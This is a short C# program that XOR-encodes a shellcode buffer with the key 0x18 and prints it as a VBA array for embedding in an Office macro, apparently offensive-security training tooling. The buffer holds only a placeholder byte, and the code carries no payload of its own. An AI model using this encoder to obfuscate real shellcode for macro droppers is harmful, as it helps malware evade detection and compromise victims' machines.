using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace VbaXorBufEncrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            // insert 32-bit csharp shellcode
            byte[] buf = new byte[1] { 0x18 };

            // perform xor on shellcode with key 0x18
            Console.WriteLine("[+] Encrypting shellcode");
            byte[] crypt = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                crypt[i] = (byte)((uint)buf[i] ^ 0x18);
            }

            // initialize counter
            uint counter = 0;

            // format the new shellcode to work with vba
            StringBuilder hex = new StringBuilder(crypt.Length * 2);
            foreach (byte b in crypt)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;

                if (counter % 50 == 0)
                {
                    hex.AppendFormat($"_{Environment.NewLine}");
                }
            }

            // print the encrypted and formatted payload
            Console.WriteLine("[+] Here is your new payload:\n");
            string NewHex = hex.ToString();
            char[] MyChar = { ',', ' ' };
            string final = NewHex.TrimEnd(MyChar);
            Console.WriteLine($"buf = Array({final})");
        }
    }
}